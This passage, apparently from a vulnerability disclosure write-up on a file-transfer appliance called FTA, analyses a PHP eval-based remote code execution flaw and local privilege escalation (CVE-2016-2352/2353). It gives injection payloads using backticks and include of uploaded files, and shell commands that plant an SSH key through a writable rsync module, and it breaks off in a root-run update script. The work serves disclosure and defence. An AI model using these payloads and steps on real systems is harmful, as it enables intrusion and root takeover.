&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;get_user_contact_list&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_csinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user_id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/[\\\/&amp;quot;\*\:\?\&amp;lt;\&amp;gt;\|&amp;amp;]/&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;echo(count(&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;(&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_csinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user_id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;quot;, array(&amp;quot;nickname&amp;quot;=&amp;gt;&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;addslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;quot;))));&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;p1&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;p&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;\\\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;$&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;\\$&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;addslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;p&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;echo(&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;(&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;quot;, &amp;quot;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;quot;));&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;If Known-Secret-Key has been acquired, the output of decrypt( $_POST[fc] ) will be controllable. And despite that the succeeding regular expressions work as a function name whitelist filter, they do not filter parameters.  &lt;br /&gt;
Therefore, the only restriction for injecting random codes in the parameters is to exclude &lt;code class=&quot;highlighter-rouge&quot;&gt;(&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;)&lt;/code&gt; in the strings. But thanks to the flexible characteristic of PHP, there are lots of ways to manipulate, just to name two examples here.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
Execute system commands directly by using backticks (`)&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;user_profile_auth(`$_POST[cmd]`);&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;A more elegant way: use the syntax INCLUDE to include the tmp_name of the uploaded files, so that any protection will give way.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;user_profile_auth(include $_FILES[file][tmp_name]);&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;local-privilege-escalation-cve-2016-2352-and-cve-2016-2353&quot;&gt;Local Privilege Escalation (CVE-2016-2352 and CVE-2016-2353)&lt;/h4&gt;
&lt;p&gt;After gaining PHP page privileges, we discovered that the privileges were assigned to user nobody. In order to engage in advanced recon, the web environment had been observed. After the observation, two possible privilege escalation vulnerabilities were identified.&lt;/p&gt;

&lt;h5 id=&quot;1-incorrect-rsync-configuration&quot;&gt;1. Incorrect Rsync Configuration&lt;/h5&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/etc/opt/rsyncd.conf&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-lighttpd&quot; data-lang=&quot;lighttpd&quot;&gt;&lt;span class=&quot;k&quot;&gt;log&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;/home/soggycat/log/kennel.log&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;soggycat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;/home/soggycat&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;uid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;soggycat&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;read&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;only&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The module name soggycat is readable and writable to anyone for the directory &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/soggycat/&lt;/code&gt;, therefore the SSH Key can be written into &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/soggycat/.ssh/&lt;/code&gt; and then use the soggycat credential to login.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;id
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync 0::soggycat/.ssh/
drwx------        &lt;span class=&quot;m&quot;&gt;4096&lt;/span&gt; 2016/01/29 18:13:41 .
-rw-r--r--         &lt;span class=&quot;m&quot;&gt;606&lt;/span&gt; 2016/01/29 18:13:41 authorized_keys

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync 0::soggycat/.ssh/authorized_keys .
bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cat id_dsa.pub &amp;gt;&amp;gt; authorized_keys
bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync authorized_keys 0::soggycat/.ssh/

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh -i id_dsa -o &lt;span class=&quot;nv&quot;&gt;UserKnownHostsFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/null -o &lt;span class=&quot;nv&quot;&gt;StrictHostKeyChecking&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;no soggycat@localhost id
Could not create directory &lt;span class=&quot;s1&quot;&gt;&amp;#39;/.ssh&amp;#39;&lt;/span&gt;.
Warning: Permanently added &lt;span class=&quot;s1&quot;&gt;&amp;#39;0,0.0.0.0&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to the list of known hosts.
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;520&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;soggycat&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;2-command-injection-in-yum-clientpl&quot;&gt;2. Command Injection in “yum-client.pl”&lt;/h5&gt;

&lt;p&gt;To enable system updates through web UI, the sudoers configuration in FTA exceptionally allows the user nobody to directly execute commands with root privileges and update software with the program &lt;code class=&quot;highlighter-rouge&quot;&gt;yum-client.pl&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/etc/sudoers&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;...
&lt;span class=&quot;nb&quot;&gt;Cmnd_Alias&lt;/span&gt;      YUM_UPGRADE = &lt;span class=&quot;sx&quot;&gt;/usr/bin/yum&lt;/span&gt; -y upgrade
&lt;span class=&quot;nb&quot;&gt;Cmnd_Alias&lt;/span&gt;      YUM_CLIENT = &lt;span class=&quot;sx&quot;&gt;/usr/local/bin/yum-client.pl&lt;/span&gt;
...
&lt;span class=&quot;c&quot;&gt;# User privilege specification&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;root&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;ALL&lt;/span&gt;=(ALL) &lt;span class=&quot;k&quot;&gt;ALL&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;admin&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: UPDATE_DNS, UPDATE_GW, UPDATE_NTP, RESTART_NETWORK, CHMOD_OLDTEMP ...
&lt;span class=&quot;nb&quot;&gt;nobody&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: SSL_SYSTEM, ADMIN_SYSTEM, IPSEC_CMD, YUM_CLIENT
&lt;span class=&quot;nb&quot;&gt;soggycat&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: ADMIN_SYSTEM, IPSEC_CMD, CHOWN_IPSEC, UPDATE_IPSEC, YUM_CLIENT
&lt;span class=&quot;nb&quot;&gt;radmin&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: RESET_APPL
...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;YUM_CLIENT&lt;/code&gt; is the command for proceeding updates. Part of the codes are as follows:&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/usr/local/bin/yum-client.pl&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-perl&quot; data-lang=&quot;perl&quot;&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;GetOptions&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;help&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$help&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;download_only&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$download_only&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;list&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;cache&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;clearcache&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$clearcache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;cdrom=s&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cdrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;appid=s&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$appid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;servername=s&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$servername&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;version=s&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;token=s&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;/usr/bin/yum&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;$YUM_CMD -C&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# if this is based on RHEL 5, change the repository&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$OS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`grep -q 5 /etc/redhat-release &amp;amp;&amp;amp; echo -n 5`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LOGFILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;/home/seos/log/yum-client.log&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$STATUSFILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;/home/seos/log/yum-client.status&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUMCONFIG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;/etc/yum.conf&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUMDIFF_FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;/home/seos/log/yum.diff&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cdrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$OS&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;eq&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;5&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;$YUM_CMD -c $cdrom_path/yum.conf-5&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;$YUM_CMD -c $cdrom_path/yum.conf&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
